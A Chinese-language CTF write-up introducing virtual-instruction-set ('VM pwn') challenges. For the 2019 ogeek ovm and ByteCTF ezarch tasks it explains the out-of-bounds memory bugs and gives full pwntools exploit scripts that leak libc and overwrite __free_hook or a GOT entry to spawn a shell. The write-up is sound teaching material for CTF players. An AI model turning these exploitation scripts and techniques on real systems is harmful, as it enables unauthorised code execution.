
# 虚拟指令集Pwn入门


                                阅读量   
                                **701244**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](./img/199832/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/199832/t01950649ab9bf74fee.jpg)](./img/199832/t01950649ab9bf74fee.jpg)



## 虚拟指令集 pwn 入门

19年末尾参加的几场线下赛差不多都有一类题目，虚拟指令集pwn、VM pwn。

这种题目比起常见的菜单堆、栈类型，还算新颖，题目最主要的特点在我看来代码量大一些，逆向起来花一些时间，redhat_final时候一道虚拟指令集pwn等到搞清楚题目逻辑已经是下午了。

此类题目并不需要什么特殊的准备知识，下面按照由易到难介绍几道此类题目的解法，熟悉此类题目的常见形式以及考点，当做虚拟指令集pwn的入门，并介绍我整理题目时候一些感悟。



## 2019-ogeek-ovm

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E9%80%BB%E8%BE%91"></a>题目逻辑

此题模拟了vm行了，提供了set,add,read，write等指令，但在读写过程当中对于索引值的处理不当，导致可以越界读写。

首先看程序的bss段,程序的主要控制结构如下。

模拟了内存，寄存器以及stack。

```
.bss:0000000000202040 comment         dq 4 dup(?)             ; DATA XREF: main+15↑o
.bss:0000000000202040                                         ; main+27E↑o ...
.bss:0000000000202060                 public memory
.bss:0000000000202060 ; _DWORD memory[65536]
.bss:0000000000202060 memory          dd 10000h dup(?)        ; DATA XREF: fetch+1B↑o
.bss:0000000000202060                                         ; main+1C8↑o ...
.bss:0000000000242060                 public reg
.bss:0000000000242060 ; _DWORD reg[16]
.bss:0000000000242060 reg             dd 10h dup(?)           ; DATA XREF: fetch+4↑o
.bss:0000000000242060                                         ; fetch+11↑o ...
.bss:00000000002420A0                 public stack
.bss:00000000002420A0 ; _DWORD stack[16]
.bss:00000000002420A0 stack           dd 10h dup(?)           ; DATA XREF: execute+1E3↑o
.bss:00000000002420A0                                         ; execute+219↑o
```

此题程序逻辑并不复杂，程序初始化过程当中要求输入pc，sp以及code size。

然后程序的主要逻辑位于execue函数中，里面有指令解析过程。

首先将内存区按照四字节长度进行处理，最高字节代表分类标志，地位三字节进行指令操作。

```
three_byte = (a1 &amp; 0xF0000u) &gt;&gt; 16;           // three byte
  two_byte = (unsigned __int16)(a1 &amp; 0xF00) &gt;&gt; 8;
  one_byte = a1 &amp; 0xF;
```

篇幅限制，只解析其中主要的指令,对应的解析看注释。

```
else if ( HIBYTE(a1) == 0x10 )
      {
        reg[three_byte] = (unsigned __int8)a1;
      }
/*
    #reg[dst] = num
    def set(dst,num):
        return u32((p8(0x10)+p8(dst)+p8(0)+p8(num))[::-1])
*/ 


      else if ( HIBYTE(a1) == 0xC0 )
      {
        reg[three_byte] = reg[two_byte] &lt;&lt; reg[one_byte];
      }
/*
    #reg[a3] = reg[a2] &lt;&lt; reg[a1]
    def shift_l(a3,a2,a1):
        return u32((p8(0xc0)+p8(a3)+p8(a2)+p8(a1))[::-1])
*/


      if ( HIBYTE(a1) == 0x70 )
      {
        reg[three_byte] = reg[one_byte] + reg[two_byte];
        return;
      }
/*
    #reg[a3] = reg[a2] + reg[a1]
    def add(a3,a2,a1):
        return u32((p8(0x70)+p8(a3)+p8(a2)+p8(a1))[::-1])
*/


      else if ( HIBYTE(a1) == 0x30 )
      {
        reg[three_byte] = memory[reg[one_byte]];
      }
/*
    #reg[dst] = memory[reg[idx]]
    def read(dst,idx):
        return u32((p8(0x30)+p8(dst)+p8(0)+p8(idx))[::-1])
*/


      case 0x40u:
        memory[reg[one_byte]] = reg[three_byte];
        break;
/*
    #memory[reg[idx]] = reg[src]
    def write(src,idx):
        return u32((p8(0x40)+p8(src)+p8(0)+p8(idx))[::-1])
*/
```

利用其中的shift_l，add，set，read，write功能即可解题。

**漏洞点**：在读写内存时，read/write功能时，没有检查索引的正负值导致可以向上索引，实现越界读写。

movsxd带符号扩展，int类型。

```
.text:0000000000000F24                 movzx   edx, [rbp+one_byte]
.text:0000000000000F28                 lea     rax, reg
.text:0000000000000F2F                 movsxd  rdx, edx
.text:0000000000000F32                 mov     ecx, [rax+rdx*4]
.text:0000000000000F35                 movzx   edx, [rbp+three_byte]
.text:0000000000000F39                 lea     rax, reg
.text:0000000000000F40                 movsxd  rdx, edx
.text:0000000000000F43                 mov     eax, [rax+rdx*4]
.text:0000000000000F46                 mov     esi, eax
.text:0000000000000F48                 lea     rax, memory
.text:0000000000000F4F                 movsxd  rdx, ecx
.text:0000000000000F52                 mov     [rax+rdx*4], esi
.text:0000000000000F55                 jmp     loc_1205
```

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"></a>利用过程
1. 越界读got表中的地址。
1. 利用打印功能通过打印寄存器输出libc地址。
1. 越界写，覆盖moment地址为__free_hook-8。
1. 最终覆盖freehook为system，触发，执行system(‘/bin/sh’)。
测试环境ubuntu 18.04

```
#https://github.com/matrix1001/welpwn
from PwnContext import *

try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')

if __name__ == '__main__':        
    context.terminal = ['tmux', 'splitw', '-h']
    context.log_level = 'debug'
    # functions for quick script
    s       = lambda data               :ctx.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, ''))
    uu64    = lambda data   :u64(data.ljust(8, ''))

    ctx.binary = './ovm'
    #ctx.custom_lib_dir = '/home/rhl/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu10_amd64' #change the libs
    #ctx.remote_libc = './libc.so'  #only change the libc.so  
    #ctx.remote = ('172.16.9.21', 9006)
    #ctx.debug_remote_libc = True

    ctx.symbols = {
        'comment':0x202040,
        'memory':0x202060,
        'reg':0x242060,
        'stack':0x2420a0,  #0x18eea0
    }

    ctx.breakpoints = [0xCF9]

    #reg[a3] = reg[a2] &lt;&lt; reg[a1]
    def shift_l(a3,a2,a1):
        return u32((p8(0xc0)+p8(a3)+p8(a2)+p8(a1))[::-1])

    #reg[a3] = reg[a2] + reg[a1]
    def add(a3,a2,a1):
        return u32((p8(0x70)+p8(a3)+p8(a2)+p8(a1))[::-1])

    #reg[dst] = memory[reg[idx]]
    def read(dst,idx):
        return u32((p8(0x30)+p8(dst)+p8(0)+p8(idx))[::-1])

    #memory[reg[idx]] = reg[src]
    def write(src,idx):
        return u32((p8(0x40)+p8(src)+p8(0)+p8(idx))[::-1])

    #reg[dst] = num
    def set(dst,num):
        return u32((p8(0x10)+p8(dst)+p8(0)+p8(num))[::-1])

    def init(pc,sp,content):
        sla('PC',pc)
        sla('SP',sp)
        sla('SIZE',len(content))
        for i in content:
            #sleep(0.1)
            sl(str(i))

    def lg(s,addr):
        print('33[1;31;40m%20s--&gt;0x%x33[0m'%(s,addr))

    rs()

    dbg()
    layout = [
        set(0,8),
        set(1,0xff),
        set(2,0xff),
        shift_l(2,2,0),
        add(2,2,1),
        shift_l(2,2,0),#0xffff00
        add(2,2,1),#0xffffff
        shift_l(2,2,0),
        set(1,0xc8),
        add(2,2,1),#0xffffffc8 = -56
        read(5,2),#reg[5] = memory[-56]
        set(1,1),
        add(2,2,1),#0xffffffc9 = -55
        read(6,2),#reg[6] = memory[-55]
        set(1,0x10),
        shift_l(1,1,0),
        set(0,0x90),
        add(1,1,0),
        add(5,5,1),
        set(1,47),
        add(2,2,1),
        write(5,2), #memory[-8] = reg[5]
        set(1,1),
        add(2,2,1),
        write(6,2), #memory[-7] = reg[6]
        u32((p8(0xff)+p8(0)+p8(0)+p8(0))[::-1])
    ]
    init(0,1,layout)

    ru('R5: ')
    low_byte = int(ru('n'), 16)
    ru('R6: ')
    high_byte = int(ru('n'), 16)

    libc = high_byte &lt;&lt; 32
    libc += low_byte
    print hex(libc)

    system = libc - 0x39e4a0
    sl('/bin/sh'+p64(system))

    irt()
```



## byteCTF2019-ezarch

这道题目模拟了虚拟机的行为，在命令处理过程当中，由于对于限制条件的设置不当，导致可以改写内存。

```
iddm@ubuntu:~/Desktop/CTF/VM_PWN/ezarch⟫ checksec ezarch
[*] '/home/iddm/Desktop/CTF/VM_PWN/ezarch/ezarch'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E9%80%BB%E8%BE%91"></a>题目逻辑

首先引出虚拟机的控制结构,逆向时插入结构体方便分析，此结构位于bss段中。

```
00000000 Container       struc ; (sizeof=0x46C, mappedto_7)
00000000 mem             dq ? //malloc申请的内存
00000008 stack           dq ? //vm 模拟stack
00000010 stack_size      dd ? //stack_size 固定大小0x1000
00000014 mem_size        dd ? //malloc_size
00000018 breakpoints     dd 256 dup(?)
00000418 R               dd 16 dup(?)//模拟R0-R15寄存器
00000458 _eip            dd ?
0000045C _esp            dd ?
00000460 _ebp            dd ?
00000464 _eflags         dq ?
0000046C Container       ends
```

程序提供几个功能

```
printf("Welcome to ezarch:n[B]reakpointsn[M]emory Setn[R]unn[E]xitn&gt;", a2);
```

Memory Set功能进行vm 初始化

```
if ( (_BYTE)buf == 'M' )
        {
          printf("[*]Memory size&gt;", &amp;buf);
          a2 = (char **)&amp;con-&gt;mem_size;
          __isoc99_scanf("%u", &amp;con-&gt;mem_size);//设置size
          v5 = con;
          mem_size = con-&gt;mem_size;
          if ( mem_size &gt; 0xA00000 )
          {
            puts("[!]too large");
          }
          else
          {
            v7 = malloc(mem_size);
            if ( v5-&gt;mem )
            {
              free((void *)v5-&gt;mem);
              v8 = con;
              con-&gt;mem_size = 0;
            }
            else
            {
              v8 = con;
            }
            v8-&gt;mem = (__int64)v7;
            v9 = 0LL;
            puts("[*]Memory inited");
            printf("[*]Inited size&gt;", a2); // 这里没有比较inited size和mem_size的大小，存在溢出
            __isoc99_scanf("%llu", &amp;v17);
            printf("[*]Input Memory Now (0x%llx)n", v17);
            while ( v9 &lt; v17 ) // 输入字节码
            {
              v11 = (void *)(con-&gt;mem + v9);
              if ( v17 - v9 &gt; 0xFFF )
              {
                v10 = read(0, v11, 0x1000uLL);
                if ( v10 &lt;= 0 )
                  goto LABEL_26;
              }
              else
              {
                v10 = read(0, v11, v17 - v9);
                if ( v10 &lt;= 0 )
LABEL_26:
                  exit(1);
              }
              v9 += v10;
            }
            puts("[*]Memory Inited");
            puts("[*]Now init some regs");
            //进行eip/esp/ebp寄存器的赋值
            printf("eip&gt;");
            v12 = &amp;con-&gt;_eip;
            __isoc99_scanf("%u", &amp;con-&gt;_eip);
            printf("esp&gt;", v12);
            v13 = &amp;con-&gt;_esp;
            __isoc99_scanf("%u", &amp;con-&gt;_esp);
            printf("ebp&gt;", v13);
            __isoc99_scanf("%u", &amp;con-&gt;_ebp);
            a2 = (char **)con;
            v14 = (unsigned __int64)&amp;con-&gt;breakpoints[2];
            v15 = (signed int)con;
            *(_QWORD *)con-&gt;breakpoints = -1LL;
            a2[130] = (char *)-1LL;
            memset((void *)(v14 &amp; 0xFFFFFFFFFFFFFFF8LL), 0xFFu, 8 * ((v15 - (v14 &amp; 0xFFFFFFF8) + 1048) &gt;&gt; 3));
            memset(&amp;unk_2020C0, 0, 0x1000uLL);
            *((_DWORD *)a2 + 4) = 4096;
            a2[1] = (char *)&amp;unk_2020C0;
          }
        }
```

接下来分析Run函数，此函数负责vm解析字节码，采用switch循环结构，每次循环字节码迁移10B，可以发现是固定长度字节码。

opcode格式如下：

```
10字节的opline结构
+0x0  opcode
+0x1  type位，标记操作数的类型，高4位代表操作数2类型，低四位代表操作数1类型
+0x2  4字节操作数1
+0x6  4字节操作数2

操作数类型 0 寄存器变量 R0-R15  16=ESP  17=EBP
操作数类型 1 立即数
操作数类型 2 取地址值
```

函数中一下判断出错，导致可以越界读写内存。

```
if ( _eip &gt;= mem_size || (unsigned int)a1-&gt;_esp &gt;= a1-&gt;stack_size || mem_size &lt;= a1-&gt;_ebp )
    return 1LL;
```

mem_size可以控制，并且stack_size固定为0x1000，当ebp偏移大于0x1000(stack地址距离bss段距离0x1000)时，由于stack位于bss段上方，可以越界读写到bss段，进而读写到libc地址段。

利用过程主要利用三个功能就可以，add,sub,mov指令即可。

解析一个mov的部分指令，如下：

```
case 3:
      judge_2 = *(_BYTE *)(v4 + 1) &gt;&gt; 4;//首先解析操作数2 type类型
      if ( judge_2 == 1 )//type = 1 立即数
      {
        num_2 = *(_DWORD *)(v4 + 6);
      }
      else if ( judge_2 &lt; 1u )//type = 0 ，寄存器的值
      {
        v45 = *(unsigned int *)(v4 + 6);//取操作数
        if ( (unsigned int)v45 &lt;= 0xF )
        {
          num_2 = a1-&gt;R[v45];
        }
        else if ( (_DWORD)v45 == 16 )
        {
          num_2 = a1-&gt;_esp;
        }
        else
        {
          if ( (_DWORD)v45 != 17 )
            return 1LL;
          num_2 = a1-&gt;_ebp;
        }
      }
      else
      {
        if ( judge_2 != 2 )//type = 2 ，对应取地址
          return 1LL;
        v42 = *(unsigned int *)(v4 + 6);
        if ( (unsigned int)v42 &lt;= 0xF )
        {
          num_2 = *(_DWORD *)(a1-&gt;mem + (unsigned int)a1-&gt;R[v42] % a1-&gt;mem_size);
        }
        else if ( (_DWORD)v42 == 16 )
        {
          num_2 = *(_DWORD *)(a1-&gt;stack + (unsigned int)a1-&gt;_esp);
        }
        else
        {
          if ( (_DWORD)v42 != 17 )
            return 1LL;
          num_2 = *(_DWORD *)(a1-&gt;stack + (unsigned int)a1-&gt;_ebp);
        }
      }
      if ( *(_BYTE *)(v4 + 1) &amp; 0xF )//操作数1 type类型
      {
        if ( (*(_BYTE *)(v4 + 1) &amp; 0xF) != 2 )
          return 1LL;
        v44 = *(unsigned int *)(v4 + 2);
        if ( (unsigned int)v44 &lt;= 0xF )
        {
          *(_DWORD *)(a1-&gt;mem + (unsigned int)a1-&gt;R[v44] % a1-&gt;mem_size) = num_2;
          v16 = a1-&gt;_eip;
        }
        else if ( (_DWORD)v44 == 16 )
        {
          *(_DWORD *)(a1-&gt;stack + (unsigned int)a1-&gt;_esp) = num_2;
          v16 = a1-&gt;_eip;
        }
        else
        {
          if ( (_DWORD)v44 != 17 )
            return 1LL;
          *(_DWORD *)(a1-&gt;stack + (unsigned int)a1-&gt;_ebp) = num_2;
          v16 = a1-&gt;_eip;
        }
      }
      else
      {
        v46 = *(unsigned int *)(v4 + 2);
        if ( (unsigned int)v46 &lt;= 0xF )
        {
          a1-&gt;R[v46] = num_2;
          v16 = a1-&gt;_eip;
        }
        else if ( (_DWORD)v46 == 16 )
        {
          a1-&gt;_esp = num_2;
          v16 = a1-&gt;_eip;
        }
        else
        {
          if ( (_DWORD)v46 != 17 )
            return 1LL;
          a1-&gt;_ebp = num_2;
          v16 = a1-&gt;_eip;
        }
      }
      goto LABEL_26;
```

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"></a>利用过程

通过调试我们一直VM stack位于bss段上方0x1000处，而且由于Run函数中对于判断条件设置有误，导致我们可以越界读写内存。

因此，我们利用思路如下：
1. 利用越界读写，使用mov将bss段地址写到vm 寄存器中。
1. 由于got表可写，利用sub功能，将vm寄存器中的bss段地址，减去对应偏移，对应到puts_got。
1. 利用mov功能，将stack的地址改为puts_got地址。
1. 利用mov功能，将puts_got地址对应的libc地址地位赋给vm寄存器
1. 然后利用sub功能，减去偏移得到对应的one_gadget地址。
1. 利用mov功能，覆盖puts_got为one_gadget地址，get shell。
调试一下vm stack地址以及大小

```
pwndbg&gt; x/20xg $node
0x5555557570c0: 0x0000555555759010      0x00005555557560c0 # stack位于bss上方0x1000处
0x5555557570d0: 0x0000300000001000      0xffffffffffffffff # stack地址大小为0x1000
0x5555557570e0: 0xffffffffffffffff      0xffffffffffffffff
0x5555557570f0: 0xffffffffffffffff      0xffffffffffffffff
0x555555757100: 0xffffffffffffffff      0xffffffffffffffff
0x555555757110: 0xffffffffffffffff      0xffffffffffffffff
0x555555757120: 0xffffffffffffffff      0xffffffffffffffff
0x555555757130: 0xffffffffffffffff      0xffffffffffffffff
0x555555757140: 0xffffffffffffffff      0xffffffffffffffff
0x555555757150: 0xffffffffffffffff      0xffffffffffffffff
pwndbg&gt; x/20xg $R
0x5555557574d8: 0x0000000000000000      0x0000000000000000
0x5555557574e8: 0x0000000000000000      0x0000000000000000
0x5555557574f8: 0x0000000000000000      0x0000000000000000
0x555555757508: 0x0000000000000000      0x0000000000000000
0x555555757518: 0x0000000000000000      0x0000000000001008
0x555555757528: 0x0000000000000000      0x0000000000000000
0x555555757538: 0x0000000000000000      0x0000000000000000
0x555555757548: 0x0000000000000000      0x0000000000000000
0x555555757558: 0x0000000000000000      0x0000000000000000
```

exp如下，利用过程参照注释，试环境ubuntu 16.04：

```
#https://github.com/matrix1001/welpwn
from PwnContext import *

try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')

if __name__ == '__main__':        
    context.terminal = ['tmux', 'splitw', '-h']
    context.log_level = 'debug'
    # functions for quick script
    s       = lambda data               :ctx.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, ''))
    uu64    = lambda data   :u64(data.ljust(8, ''))

    ctx.binary = './ezarch'
    #ctx.custom_lib_dir = '/home/iddm/glibc-all-in-one/libs/2.27-3ubuntu1_amd64'
    #ctx.remote = ('172.16.9.21', 9006)
    #ctx.debug_remote_libc = True

    ctx.symbols = {
        'node':0x2030C0,
        'R':0x2030c0+0x418
    }

    ctx.breakpoints = [0xfd0]#menu

    def lg(s,addr):
        print('33[1;31;40m%20s--&gt;0x%x33[0m'%(s,addr))

    def init(size,init_size,memory,eip,esp,ebp):
        sla('[E]xitn&gt;','M')
        sla('Memory size&gt;',size)
        sla('size&gt;',init_size)
        sa('Input Memory Now',memory)
        sla('eip&gt;',eip)
        sla('esp&gt;',esp)
        sla('ebp&gt;',ebp)

    def sub(type,op1,op2):
        return 'x02'+type+p32(op1)+p32(op2)

    def mov(type,op1,op2):
        return 'x03'+type+p32(op1)+p32(op2)

    rs()
    dbg()

    payload = ''
    #mov R[0],*(stack+ebp)
    payload += mov('x20',0,17)
    #sub R[0],0xa0
    payload += sub('x10',0,0xa0)
    #mov *(stack+ebp),R[0]
    payload += mov('x02',17,0)
    #mov R[0],*(stack+esp)
    payload += mov('x20',0,16)
    #sub R[0],offset
    payload += sub('x10',0,0x2a47a)
    #mov *(stack+esp),R[0]
    payload += mov('x02',16,0)

    init(0x3000,len(payload),payload,0,0,0x1008)

    sla('[E]xitn&gt;','R')

    irt()
```



## 2019-redhatfinal-pwn3

此题并非模拟了vm行为，而单纯的自己设计指令，并根据规则解析输入的内容。

指令逻辑还是比较繁多的，逆向清楚已经是下午了，做出来以后没得几次分就比赛结束了。

之前写过这篇的wp，移步[链接](https://bbs.pediy.com/thread-255782.htm)。



## 总结

2019年ciscn初赛的时候有一道比较简单的虚拟指令集pwn，如果觉得上述有些困难的话，可以先从这里入门体验一下，推荐一个[文章](//23r3f.github.io/2019/04/23/2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B/#virtual)),感兴趣可以去看一下。

上面分析了三道题目，前两道属于第一类，模拟VM行为pwn；第三道属于虚拟指令集pwn，单纯解析输入执行指令。

通过上面三道题目，可以发现这类题目代码量一般较大，逆向难度偏高，就像[m4p1e](http://wiki.m4p1e.com/article/getById/67)师傅介绍的，我们对于此类题目应该搞清楚的主要有几个地方：
1. 题目过程当中的指令集有哪些。
1. 每个指令解析过程具体是如何进行的。
在逆向过程中带着这个意识去分析，对于可以读写内存的指令着重关注，并且一般解题并不需要全部的指令，出题人可能为了加大难度加了些多余的指令，特别对于线下赛时，可以边分析边解题，解题脚本写不下去时继续分析，这样对于线下赛先解题得分高的环境下是比较有利的，吸取我当初的教训。



## Refferings:

[https://dittozzz.top/2019/09/28/VM-pwn-%E5%88%9D%E6%8E%A2/](https://dittozzz.top/2019/09/28/VM-pwn-%E5%88%9D%E6%8E%A2/)

[http://blog.eonew.cn/archives/1224#ovm](http://blog.eonew.cn/archives/1224#ovm)

[http://blog.leanote.com/post/xp0int/%5BPwn%5D-ezarch-cpt.shao](http://blog.leanote.com/post/xp0int/%5BPwn%5D-ezarch-cpt.shao)

[http://blog.eonew.cn/archives/1220#ezarch](http://blog.eonew.cn/archives/1220#ezarch)

[http://wiki.m4p1e.com/article/getById/67](http://wiki.m4p1e.com/article/getById/67)
